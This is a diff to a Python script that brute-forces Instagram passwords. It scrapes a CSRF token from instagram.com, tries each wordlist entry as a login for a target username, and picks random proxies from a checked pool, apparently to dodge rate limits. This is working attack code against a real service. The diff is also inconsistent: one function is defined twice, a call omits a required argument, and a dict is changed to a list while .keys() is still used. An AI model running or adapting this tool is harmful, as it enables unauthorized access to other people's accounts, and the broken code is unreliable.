@@ -27,6 +27,40 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
+def main(username, words):
+
+  response = rq.urlopen('http://www.instagram.com')
+  html = response.read()
+
+  csrf_token = extract_csrf_token(html)
+
+  for word in words:
+
+    password = word.strip()
+
+    craft_response(username, password, csrf_token)
+
+
+
+def extract_csrf_token(text):
+
+  page_text = str(text)
+
+  result = page_text.find("csrf_token")
+  after = page_text[result + len("csrf_token"):-1]
+
+
+  csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")
+
+  if len(csrf_token) == 0:
+    print ("[-] Error extraction CSRF token, exiting...")
+    exit()
+  else:
+
+    print ("CSRF token is: " + csrf_token)
+    return csrf_token
+
+
 
 def craft_response(username, password, csrf_token, proxy):
 
@@ -67,10 +101,11 @@ def craft_response(username, password, csrf_token, proxy):
     "Cookie": "csrf_token=" + csrf_token
   }
 
-  if proxy is not None:
-    proxy_support = rq.ProxyHandler({'https': 'https://' + proxy})
-    opener = rq.build_opener(proxy_support)
-    rq.install_opener(opener)
+  """
+  proxy_support = rq.ProxyHandler({'https': 'https://' + proxy})
+  opener = rq.build_opener(proxy_support)
+  rq.install_opener(opener)
+  """
 
   
 
@@ -115,11 +150,23 @@ def is_bad_proxy(pip):
         req=rq.Request('http://www.google.com')  # change the URL to test here
         sock=rq.urlopen(req)
 
-    except Exception as err:
-        print("Error: {0}".format(err))
+    except Exception as detail:
+        #print("ERROR:", detail)
         return True
     return False
 
+def find_working_proxies(proxy_list):
+
+  good_proxies = []
+
+  for proxy in proxy_list:
+
+    print (proxy)
+
+    if not is_bad_proxy(proxy):
+      good_proxies.append(proxy)
+
+  return good_proxies
 
 def check_avalaible_proxys(proxys):
     """
@@ -157,7 +204,6 @@ def check_proxy(q):
     check proxy for and append to working proxies
     :param q:
     """
-
     if not q.empty():
 
         proxy = q.get(False)
@@ -166,7 +212,6 @@ def check_proxy(q):
 
         try:
         
-
             
             
             is_working = False
@@ -181,7 +226,10 @@ def check_proxy(q):
             
 
         except Exception as err:
-            print(" --[!] ", proxy, " | FAILED | " + str(err))
+            if _verbose:
+                print(" --[!] ", proxy, " | FAILED")
+            if _debug:
+                print(logger.error(err))
             pass  
 
 def brute(q):
@@ -195,21 +243,26 @@ def brute(q):
         try:
             proxy = None
 
-            #print(proxys_working_list)
-
             if len(proxys_working_list) != 0:
                 proxy = random.choice(list(proxys_working_list.keys()))
 
             word = q.get()
             word = word.replace("\r", "").replace("\n", "")
 
+            #craft request with proxy
+
+            response = rq.urlopen('http://www.instagram.com')
+            html = response.read()
+
+            csrf_token = extract_csrf_token(html)
+
 
             password = word.strip()
 
-            craft_response(username, word, csrf_token, proxy)
+            craft_response(username, password, csrf_token, proxy)
 
         except Exception as error:
-          print (str(error) + traceback.print_exc())
+          print(traceback.print_exc())
 
 
 
@@ -253,32 +306,37 @@ def starter():
 
 def get_csrf():
 
-  try:
-    response = rq.urlopen('http://www.instagram.com')
-    html = response.read()
-
-    page_text = str(html)
-
-    result = page_text.find("csrf_token")
-    after = page_text[result + len("csrf_token"):-1]
+  global csrf_token
 
 
-    csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")
+  response = rq.urlopen('http://www.instagram.com')
+  html = response.read()
 
-    if len(csrf_token) == 0:
-      print ("[-] Error extracting CSRF token, exiting...")
-      exit()
-    else:
+  csrf_token = extract_csrf_token(html)
 
-      #print ("CSRF token is: " + csrf_token)
-      print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
-      return csrf_token
-  except Exception as e:
-    print ("[-] Error extracting CSRF token, exiting...")
-    print (str(e))
+  print(bcolors.OKGREEN + "[+] CSRF Token :", csrf_token, "\n" + bcolors.ENDC)
+
+
+
+def extract_csrf_token(text):
+
+  page_text = str(text)
+
+  result = page_text.find("csrf_token")
+  after = page_text[result + len("csrf_token"):-1]
+
+
+  csrf_token = after[:after.find(",")].replace(":", "").replace("\"", "")
+
+  if len(csrf_token) == 0:
+    print ("[-] Error extraction CSRF token, exiting...")
     exit()
+  else:
 
-  
+    #print ("CSRF token is: " + csrf_token)
+    return csrf_token
+
+
 
 
 
@@ -287,9 +345,8 @@ if __name__ == "__main__":
 
 
   global proxys_working_list
-  proxys_working_list = {}
-  global username
-  global csrf_token
+
+  proxys_working_list = []
 
   # Parse args
   parser = argparse.ArgumentParser(
@@ -308,7 +365,7 @@ if __name__ == "__main__":
   args = parser.parse_args()
 
   USER = args.username
-  
+  global username
   username = USER
 
   try:
@@ -324,8 +381,8 @@ if __name__ == "__main__":
       sys.exit(1)
 
 
-  csrf_token = get_csrf()
   #check_avalaible_proxys(proxies)
+  get_csrf()
   starter()
 
 
